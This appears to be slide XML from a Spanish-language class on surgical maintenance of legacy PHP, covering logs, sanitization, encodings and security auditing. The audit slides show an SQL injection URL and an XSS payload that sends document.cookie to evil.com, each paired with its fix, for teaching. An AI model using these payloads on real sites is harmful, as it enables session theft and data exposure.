            <a:ext cx="4453128" cy="877824"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 4167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" y="517550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0704" y="522122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1609344" y="5175504"/>
            <a:ext cx="73152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810512" y="519379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Grafo de Dependencias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1810512" y="548640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Identificar qué otros archivos incluye (include/require).</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1060" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="35" name="Shape 32"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="5586984" y="5047488"/>
            <a:ext cx="4453128" cy="877824"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 4167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96712" y="5175504"/>
            <a:ext cx="420624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96712" y="5221224"/>
            <a:ext cx="42062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</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="780" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="38" name="Shape 35"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="6245352" y="5175504"/>
            <a:ext cx="73152" cy="6217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5193792"/>
            <a:ext cx="3465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Puntos de Retorno</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1360" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="40" name="Text 37"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="6446520" y="548640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Localizar todos los 'header(Location...)' y 'exit;'.</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="106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Diagnóstico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Diagnóstico: El Arte de Leer Logs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Visibilidad en el Caos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6217920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5961888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5742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Habilitando el Microscopio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5797296" cy="340156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260336" y="2029968"/>
            <a:ext cx="2926080" cy="4151376"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 938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33488" y="2139696"/>
            <a:ext cx="100584" cy="39319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16368" y="215798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Mentalidad Senior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16368" y="2432304"/>
            <a:ext cx="2596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amateur intenta corregir probando a ciegas en el navegador. Un profesional abre la terminal y revisa el log de errores para ver el mensaje exacto del servidor.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Seguridad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Sanitización Dual: El Escudo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Seguridad en la Jungla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tipos de ataques, dos soluciones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mysqli_real_escape_string()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Limpia comillas y caracteres raros antes de que lleguen a la Base de Datos.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XSS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htmlspecialchars()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Convierte etiquetas &lt;script&gt; en texto inofensivo para que no se ejecuten al mostrar.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Filtro de Entrada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lo que viene de $_POST es radiactivo hasta que lo limpies.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Filtro de Salida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Todo lo que imprimes con 'echo' debe ser sanitizado para la vista.</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="10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Patrones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Patrón 'Costura' (Seam)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4.5 Intervención de Mínimo Impacto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'Costura' es un lugar donde puedes alterar el comportamiento sin editar el código fuente original (o editándolo mínimamente).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291840"/>
            <a:ext cx="9381744" cy="2889504"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 126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40156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47472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Identificando la costura en editar_user.php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3858768"/>
            <a:ext cx="8961120" cy="2139696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Metodología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de Caracterización con IA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4.6 IA como Red de Seguridad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como Test Unitario Humano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Genérica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Poco útil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'¿Este código PHP funciona bien?'.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 dirá que sí o dará consejos genéricos.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ayuda a prevenir regresiones.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entiende el flujo.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de Caracterización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Analizando Casos de Borde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'Analiza este PHP: ¿Qué pasa exactamente si $_SESSION['user_id'] está vacío y el usuario envía el POST? Describe el flujo paso a paso'.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Revela huecos de seguridad.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Documenta el comportamiento real.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Actúa como un test antes de cambiar.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Caracterizar es entender cómo se comporta el sistema HOY, antes de intentar mejorarlo.</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="84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Datos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Fechas y Tiempos en el Barro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4.6 El dolor de cabeza clásico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Manejo de Tiempos Legacy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date('Y-m-d')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forma clásica de formatear. Cuidado con el timezone del servidor.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strtotime()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Convierte casi cualquier texto en un timestamp. Es poderosa pero impredecible.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Formatos Inconsistentes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legado verás fechas como strings, como enteros o como datetime.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al rescate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agentes para convertir formatos complejos entre el front y la DB legacy.</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="106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Datos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la 'Ñ': Encodings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4.6 UTF-8 vs. Latin1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Guerra de Caracteres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724912"/>
            <a:ext cx="109728" cy="3127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 Moderna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61872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UTF-8</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="940" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="17" name="Shape 14"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1261872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53312" y="3461004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99616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Soporta emojis.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261872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53312" y="3899916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99616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Soporta todos los idiomas.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261872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53312" y="4338828"/>
            <a:ext cx="82296" cy="82296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99616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Estándar global.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355080" y="2596896"/>
            <a:ext cx="3685032" cy="3383280"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 108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64808" y="2724912"/>
            <a:ext cx="109728" cy="3127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65976" y="2724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Sistemas Legacy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665976" y="2999232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ISO-8859-1</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="940" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="30" name="Shape 27"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="6665976" y="3346704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57416" y="3461004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03720" y="3392424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soporta latinos básicos.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665976" y="3785616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57416" y="3899916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903720" y="3831336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Rompe las tildes y las 'ñ'.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665976" y="4224528"/>
            <a:ext cx="3227832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757416" y="4338828"/>
            <a:ext cx="82296" cy="8229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03720" y="4270248"/>
            <a:ext cx="2935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 el 'mojibake' (Ã±).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892040" y="3474720"/>
            <a:ext cx="1207008" cy="1627632"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 4545"/>
            </a:avLst>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="F2E7D9"/>
          </a:solidFill>
          <a:ln w="12700">
            <a:solidFill>
              <a:srgbClr val="F2E7D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01768" y="3621024"/>
            <a:ext cx="987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4920" y="4041648"/>
            <a:ext cx="841248" cy="164592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56632" y="3666744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</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1060" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="43" name="Text 40"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="5020056" y="445312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codificación</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="72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Documentación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Documentación Arqueológica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4.7 Sembrando para el Futuro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Comentando lo indescifrable con IA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Seguridad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 de Peligros Legacy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4.8 Auditoría de Seguridad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buscar apenas abres un .php antiguo?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Concatenación SQL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variables PHP pegadas directamente en strings de SELECT/UPDATE.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eval()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Cualquier ejecución de strings como código es una puerta abierta total.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include/require dinámicos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 de archivos basada en variables de URL ($_GET['page']).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Falta de Casting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IDs de URL sin asegurar que sean enteros: (int)$_GET['id'].</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="106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Inseguro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SQLi: El Código Inseguro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4.8 Caso de Estudio SQLi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buscar_usuario.php (Vulnerable)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Exploit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SQLi: El Exploit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4.8 Rompiendo la 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Ataque por bypass de ID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atacante cambia la URL por: buscar.php?id=-1 OR 1=1 --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32688" y="360273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367588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 en el Servidor (SQL resultante)</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="10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4059936"/>
            <a:ext cx="8961120" cy="1938528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Corregido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SQLi: Parche Quirúrgico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4.8 Solución de Mínimo Impacto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Parcheando sin romper el estilo del autor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Inseguro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XSS: El Código Inseguro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4.9 Inyección en la Vista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3969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12848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saludo.php (Vulnerable)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596896"/>
            <a:ext cx="896112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Exploit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XSS: El Exploit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4.9 Robo de sesión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280160"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 2857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6112" y="2157984"/>
            <a:ext cx="109728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" y="2139696"/>
            <a:ext cx="9034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Inyección de Script Malicioso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60704" y="2487168"/>
            <a:ext cx="9034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Atacante envía URL: saludo.php?nombre=&lt;script&gt;fetch('https://evil.com?c='+document.cookie)&lt;/script&gt;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4672" y="3493008"/>
            <a:ext cx="9381744" cy="2688336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3657600"/>
            <a:ext cx="897940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 del usuario ejecutará el script, enviando sus cookies al servidor del atacante sin que se de cuenta.</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="2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Corregido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XSS: El Estándar de Oro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4.9 htmlspecialchars()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457200" y="2029968"/>
            <a:ext cx="11274552" cy="4151376"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 881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85216" y="2139696"/>
            <a:ext cx="11018520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" y="2212848"/>
            <a:ext cx="10799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Escape de caracteres especiales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656" y="2596896"/>
            <a:ext cx="10853928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Peligro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 LFI: Inyección de Archivos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4.10 Local File Inclusion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1828800"/>
            <a:ext cx="9381744" cy="1463040"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 25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193852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01168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Vulnerable (Insecure)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4128" y="2395728"/>
            <a:ext cx="8961120" cy="71323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04672" y="3474720"/>
            <a:ext cx="9381744" cy="2926080"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 125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32688" y="3584448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284B75"/>
          </a:solidFill>
          <a:ln w="12700">
            <a:solidFill>
              <a:srgbClr val="284B7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42416" y="3657600"/>
            <a:ext cx="8906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Seguro (Whitelisting)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4128" y="4041648"/>
            <a:ext cx="8961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Auditoría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Auditora de Código Inseguro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Encontrando Agujeros en el Pasado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Débil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Superficial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'¿Este código PHP es seguro?'.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 en ver la conexión con la DB.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Ignora el contexto de las sesiones.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 una respuesta genérica.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 de Auditoría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Simulación de Ataque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'Actúa como un analista de seguridad. Examina este script legacy: lista puntos de SQL Injection, XSS y LFI. Sugiere correcciones quirúrgicas que mantengan la compatibilidad'.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Mapea ataques reales.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Prioriza el parcheo.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 el porqué del riesgo.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IA lee el código 'con malicia' para que tú lo repares con maestría.</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="84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Estrategia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Defensa en Profundidad en el Barro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4.11 Capas de Protección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Protegiendo cuando no puedes refactorizar todo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WAF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Firewall de Aplicación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ModSecurity o Cloudflare para bloquear ataques conocidos antes de que lleguen al PHP.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Endurecimiento de php.ini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Deshabilitar allow_url_fopen y funciones peligrosas como system/exec.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Permisos Mínimos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 el usuario de la DB solo tenga permisos de SELECT/UPDATE, no de DROP o CREATE.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Monitoreo de Anomalías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Alertar si una IP genera demasiados errores de sintaxis SQL en poco tiempo.</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="106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Ética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Ética y Profesionalismo ante el Legado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4.7 La mentalidad del Ingeniero Senior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te quejes del código que hoy sostiene tu sueldo. Tu trabajo es ser la solución, no el crítico.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291840"/>
            <a:ext cx="9381744" cy="2889504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688" y="3419856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493008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Decálogo del Profesional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950976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572768" y="3931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73936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Respeto al Autor</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1360" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="20" name="Text 17"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1773936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insultes el código viejo; no sabes bajo qué presión se escribió.</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1060" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="21" name="Shape 18"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="5586984" y="3803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96712" y="3931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96712" y="3977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6208776" y="3931920"/>
            <a:ext cx="73152" cy="7223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9944" y="3950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 del Negocio</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1360" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="26" name="Text 23"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="6409944" y="4242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código feo genera dinero, es código exitoso.</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1060" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="27" name="Shape 24"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="950976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60704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1572768" y="5074920"/>
            <a:ext cx="73152" cy="7223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773936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Humildad Técnica</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1360" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="32" name="Text 29"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1773936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Saber FastAPI es fácil; saber arreglar PHP sin romperlo es difícil.</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1060" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="33" name="Shape 30"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="5586984" y="4946904"/>
            <a:ext cx="4453128" cy="978408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96712" y="5074920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696712" y="5120640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IA</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="780" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="36" name="Shape 33"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="6208776" y="5074920"/>
            <a:ext cx="73152" cy="72237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9944" y="5093208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Aliada</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1360" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="38" name="Text 35"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="6409944" y="5385816"/>
            <a:ext cx="35021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herramientas modernas para domar tecnologías antiguas.</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="106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Peligro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Peligro: El Infierno de las Comillas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4.3 Errores de sintaxis fatales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Concatenación y SQL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416" y="2688336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88720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88720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1188720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SET f='$var' (comilla simple)</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1380" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="18" name="Text 15"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1188720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$var tiene una comilla (o'connor), el SQL se rompe.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5596128" y="2578608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87568" y="2688336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33872" y="2706624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33872" y="2752344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833872" y="2999232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Uso de mysqli_real_escape_string</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1380" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="24" name="Text 21"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="5833872" y="3383280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Limpia los datos antes de inyectarlos al SQL. Vital en legado.</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1040" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="25" name="Shape 22"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="950976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42416" y="4480560"/>
            <a:ext cx="91440" cy="138988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88720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88720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880" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="29" name="Text 26"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1188720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Confundir puntos y comas.</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1380" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="30" name="Text 27"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1188720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PHP el punto une strings. Un punto mal puesto detiene el servidor.</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1040" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="31" name="Shape 28"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="5596128" y="4370832"/>
            <a:ext cx="4443984" cy="1609344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87568" y="4480560"/>
            <a:ext cx="91440" cy="138988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833872" y="4498848"/>
            <a:ext cx="585216" cy="219456"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 1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33872" y="4544568"/>
            <a:ext cx="5852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5833872" y="4791456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Validación por IA.</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1380" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="36" name="Text 33"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="5833872" y="5175504"/>
            <a:ext cx="40965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 el agente para que 'lea' si tus comillas están balanceadas.</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="104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IA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como Consultora Quirúrgica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Huella Metodológica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078224"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 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de Mantenimiento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2596896"/>
            <a:ext cx="73152" cy="3072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15568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Error de Novato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52144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Pedir reescritura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1115568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25296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'Limpia este archivo editar.php para que sea mejor y más moderno'.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1170432" y="459943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80160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Borra dependencias del sitio.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1170432" y="496519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80160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 la conexión a la DB.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1170432" y="5330952"/>
            <a:ext cx="54864" cy="548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80160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Inutiliza el sistema.</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="740" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="26" name="Shape 23"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="5577840" y="2596896"/>
            <a:ext cx="4462272" cy="3072384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577840" y="2596896"/>
            <a:ext cx="73152" cy="3072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742432" y="2743200"/>
            <a:ext cx="4151376" cy="310896"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 882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33872" y="2816352"/>
            <a:ext cx="3968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Enfoque Quirúrgico</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1180" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="30" name="Text 27"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="5779008" y="3127248"/>
            <a:ext cx="4096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Intervención Focalizada</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="780" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="31" name="Shape 28"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="5742432" y="3383280"/>
            <a:ext cx="4151376" cy="932688"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 3922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52160" y="349300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'Tengo este archivo editar.php. Solo quiero añadir el campo telefono. Genera el snippet para el POST, el SQL y el HTML respetando las variables actuales'.</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="780" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="33" name="Shape 30"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="5797296" y="459943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07024" y="448056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la integridad.</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="740" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="35" name="Shape 32"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="5797296" y="496519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07024" y="484632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mínimo y seguro.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5797296" y="5330952"/>
            <a:ext cx="54864" cy="548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07024" y="5212080"/>
            <a:ext cx="3968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Fácil de auditar.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987552" y="5943600"/>
            <a:ext cx="9015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busques elegancia en el legado; busca precisión y continuidad.</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="84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Validación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Protocolo Smoke Test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 · 4.4 La prueba de fuego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de verificación post-operación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 de Página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página abre sin errores 500 o 'White Screen of Death'?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Persistencia Real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¿Si guardas el teléfono nuevo, aparece al refrescar la página?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de Sesión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¿Sigues logueado tras guardar o la sesión se cerró por error?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F8E4E5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XSS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Básica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pasa si guardas un &lt;script&gt; en el nuevo campo?</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="106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E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402336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438912"/>
            <a:ext cx="2889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PREGUNTAS GUÍA — BLOQUE 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04672" y="1060704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1463040" y="1024128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es vital respetar el estilo del autor original en una cirugía de software?</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1560" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="8" name="Shape 5"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="804672" y="2596896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852928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1463040" y="2816352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¿En qué etapa del mantenimiento quirúrgico es más útil la ayuda de un agente de IA?</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1560" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="11" name="Shape 8"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="804672" y="4389120"/>
            <a:ext cx="9400032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" y="4645152"/>
            <a:ext cx="530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8C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1463040" y="4608576"/>
            <a:ext cx="797356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buscamos confirmar al realizar un 'Smoke Test' tras una intervención?</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="156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Síntesis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Abstracción al Barro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Síntesis Semanal · El Ingeniero Versátil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1042416"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 614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194560"/>
            <a:ext cx="8979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verdadero senior navega entre la elegancia de FastAPI y la cruda realidad del PHP Legacy.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04672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3419856"/>
            <a:ext cx="100584" cy="1664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0704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Pasado (Hoy)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60704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PHP puro, sesiones nativas y archivos mezclados.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950208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23360" y="3419856"/>
            <a:ext cx="100584" cy="16642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06240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Presente (Ayer)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06240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APIs REST, Pydantic y tipado estricto en Python.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095744" y="3310128"/>
            <a:ext cx="2926080" cy="1883664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168896" y="3419856"/>
            <a:ext cx="100584" cy="16642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51776" y="343814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Futuro (Mañana)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351776" y="3712464"/>
            <a:ext cx="2596896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MVC para poner orden al caos.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93392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16 · Cierre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59536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Resumen Final de la Sesión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76656" y="1536192"/>
            <a:ext cx="8275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4 Pilares del Mantenimiento</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1060" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="10" name="Shape 7"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="804672" y="2029968"/>
            <a:ext cx="9381744" cy="4151376"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 8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157984"/>
            <a:ext cx="9125712" cy="310896"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 88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2231136"/>
            <a:ext cx="8906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aprendimos hoy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950976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60704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1572768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73936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Legado como Activo</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1360" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="18" name="Text 15"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1773936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código antiguo paga sueldos; se respeta y se diagnostica.</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1060" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="19" name="Shape 16"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="5586984" y="2542032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96712" y="2670048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96712" y="271576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208776" y="2670048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9944" y="2688336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Lectura Técnica</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1360" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="24" name="Text 21"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="6409944" y="2980944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Sintaxis PHP y Superglobales ($ _GET, $ _POST) como base HTTP.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950976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0704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1572768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73936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Persistente</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1360" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="30" name="Text 27"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1773936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Gestión de sesiones y cookies para recordar la identidad.</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1060" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="31" name="Shape 28"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="5586984" y="4315968"/>
            <a:ext cx="4453128" cy="1609344"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 2273"/>
            </a:avLst>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="E6EEF7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696712" y="4443984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96712" y="4489704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780" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="34" name="Shape 31"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="6208776" y="4443984"/>
            <a:ext cx="73152" cy="135331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9944" y="4462272"/>
            <a:ext cx="3502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Cirugía de Software</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1360" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="36" name="Text 33"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="6409944" y="4754880"/>
            <a:ext cx="3502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Intervenciones mínimas, precisas y seguras (Axioma de Integridad).</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="106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96528" y="256032"/>
            <a:ext cx="621792" cy="621792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3" name="Image 0" descr="C:\Users\Diego Obando\dev\pro301-taller-de-aplicaciones-para-internet\.agent\skills\slides-aiep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04672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46074" y="1115568"/>
            <a:ext cx="241402" cy="64373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27709" y="1296619"/>
            <a:ext cx="201168" cy="46268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4672" y="1956816"/>
            <a:ext cx="841248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Próxima Clase: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Patrones y MVC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04672" y="3310128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Descubriremos cómo aplicar patrones de diseño para rescatar el código legacy, separando la lógica de negocio de la visualización para lograr sistemas escalables.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804672" y="5321808"/>
            <a:ext cx="9381744" cy="749808"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 4878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486400"/>
